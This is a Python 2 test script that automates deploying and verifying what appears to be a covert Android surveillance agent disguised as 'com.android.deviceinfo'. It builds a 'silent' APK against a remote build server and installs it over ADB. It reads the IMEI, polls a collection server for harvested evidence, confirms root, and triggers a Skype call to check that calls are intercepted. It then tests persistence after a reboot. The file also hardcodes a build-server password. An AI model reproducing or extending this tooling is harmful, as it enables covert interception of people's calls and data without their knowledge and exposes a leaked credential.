__author__ = 'olli'

import os
import sys
import csv
import time
import datetime
import traceback
import collections
from com.dtmilano.android.adb.adbclient import AdbClient
import adb

from commands import build_apk,dev_is_rooted,check_evidences

sys.path.append("/Users/olli/Documents/work/AVTest/")
from AVAgent import build

service = 'com.android.deviceinfo'
installer = "default"


def get_deviceId(device):
    d_out = device.shell("dumpsys iphonesubinfo")
    lines = d_out.strip()
    devline = lines.split("\n")[2]
    dev_id = devline.split("=")[1].strip()
    return dev_id

def get_properties(device, *props):

    def get_property(device, prop_name):
        return device.getProperty(prop_name)

    res = {}
    for prop in props:
        if "." in prop:
            name = prop.split(".")[-1]
        else:
            name = prop
        res[name] = get_property(device, prop)

    dev_name = "%s %s" % (res["manufacturer"], res["model"])
    dev_id = get_deviceId(device)

    results = collections.OrderedDict()
    results['time'] = "%s" % datetime.datetime.now()
    results['device'] = dev_name
    results['id'] = dev_id
    results['release'] = res["release"]
    results['selinux'] = res["enforce"]
    results["rooted"] = dev_is_rooted(device)
    results['error'] = ""
    results["return"] = ""
    results["sdk"] = int(res["sdk"])

    return results

def write_results(results):
    print results.keys()
    with open('tmp/test-%s.csv' % results["id"], 'wb') as csvfile:
    # write header
        devicelist = csv.writer(csvfile, delimiter=";",
                                quotechar="|", quoting=csv.QUOTE_MINIMAL)
        devicelist.writerow(results.values())

def test_device(device, results):

    print results

    build.connection.host = "rcs-castore"
    build.connection.passwd = "Castorep123"

    dev = device.serialno
    adb.uninstall(service, dev)

    if not build_apk("silent", "castore", results["device"]):
        print "error building apk for testing"
        return

    apk = "build/android/install.%s.apk" % installer

    print "installing ", apk
    if not adb.install(apk, dev):
        return "installation failed"

    results["installed"] = True
    if not adb.executeGui(service, dev):
        return "execution failed"
    else:
        print "execution success"
        results["executed"] = True

    time.sleep(10)

    #print "slept"

    # sync e verifica

    for i in range(18):
        print "check evidences"
        ret, msg = check_evidences("192.168.100.100", "device", imei=results["imei"])

        if ret:
            break
#            print "it doesn't work", msg
#            print msg
#            return
        time.sleep(10)

    if not ret:
        print "cannot get evidences"
        return

    print "0: ", msg[0]["data"]["content"]
    #print "1: ", msg[1]["data"]["content"]
    if "Root: yes" not in msg[0]["data"]["content"]:
        print "No root buddy!"
        return

    print "rooted phone"

    #print datetime.datetime.now()

    if results["sdk"] < 15 or results["sdk"] > 17:
        return "skype call not supported by OS"
    time.sleep(60)
    print "Skype call and sleep"
    device.shell("am start -a android.intent.action.VIEW -d skype:echo123?call")

    time.sleep(120)
    print device.shell('rilcap qzx "ls -R /data/data/com.android.deviceinfo/files"')

    # check for skype call then
    ret, msg = check_evidences("192.168.100.100", "call")
    if ret is False:
        print "it didn't work"
        return
    if len(msg[0]["data"]["content"]) == 0:
        print "no skype calls"
        return
    else:
        print "calls found %d" % len(msg[0]["data"]["content"])

    print "reboot"
    adb.reboot(dev)
    time.sleep(120)

    processes = adb.ps(dev)
    running = "persistence: %s" % service in processes
    results['running'] = running

    #uninstall
    """
    print "try uninstall"
    print "uninstalled"
    adb.uninstall(service, dev)
    """
    return True

def main(serialno):
    global installer

    devices = adb.get_attached_devices()

    print """ prerequisiti:
    1) Telefono connesso in USB,
    2) USB Debugging enabled (settings/developer options/usb debugging)
    3) connesso wifi a RSSM
    4) screen time 2m (settings/display/sleep)
    """

    print "devices connessi:"
    for device in devices:
        print device

    dev = None
    if not devices:
        print "non ci sono device connessi"
    else:

        if len(devices) > 1:
            dev = raw_input("su quale device si vuole eseguire il test? ")
            print "Eseguo il test su %s" % dev

        device = AdbClient(serialno=serialno)

        # find properties of phone

        props = get_properties(
            device, "ro.product.manufacturer", "ro.product.model",
            "ro.build.selinux.enforce", "ro.build.version.release",
            "ro.build.version.sdk"
        )

        imei = device.shell("dumpsys iphonesubinfo").split("\n")[2].split(" ")[-1]
        print imei

        if imei == None:
            return

        props["imei"] = imei.strip()

        #installer = "default"

        # doing test here
        maj = props["release"].split(".")[0]
        min = props["release"].split(".")[1]

        print maj, min
        if maj == "2":
            installer = "v2"

        try:
            ret = test_device(device, props)
            props["return"] = ret
            print "return: %s " % ret
        except Exception, ex:
            traceback.print_exc(props["id"])
            props['error'] = "%s" % ex

        # write results
        write_results(props)

    print "Fine."

if __name__ == "__main__":
    if len(sys.argv) == 2:
        serialno = sys.argv[1]
    else:
        serialno = ".*"

    print os.getcwd()
    main(serialno)
